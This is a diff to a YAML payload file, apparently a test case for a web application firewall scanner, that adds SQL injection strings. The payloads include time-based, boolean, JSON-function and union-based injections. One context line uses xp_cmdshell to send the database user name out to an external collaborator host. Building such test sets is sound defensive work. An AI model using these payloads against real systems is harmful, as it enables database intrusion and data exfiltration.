@@ -6,6 +6,13 @@ payload:
   - "')) or pg_sleep(5)--"
   - "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/"
   - "3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3"
+  - "-1134')  OR JSON_EXTRACT('{''aKER'': 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa"
+  - "123) AND 12=12  AND JSON_DEPTH('{}') != 2521"
+  - "123) AND ELT(5287=5287,5480)  AND JSON_ARRAY_LENGTH('[]') <= 2333"
+  - "123 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7162766a71,(SELECT (ELT(1141=1141,1))),0x7178717a71)) USING utf8)))"
+  - "123) AND (SELECT 'eNOW')='FsQu'  AND JSON_LENGTH('{}') <= 9779"
+  - "-1' and .0union+distinct+select+1+--+"
+  - "<F5>/strrr/821} union # distinctrow/**/select 1,2,3--{<F5>/**/TRUE"
 encoder:
   - Base64Flat
   - URL
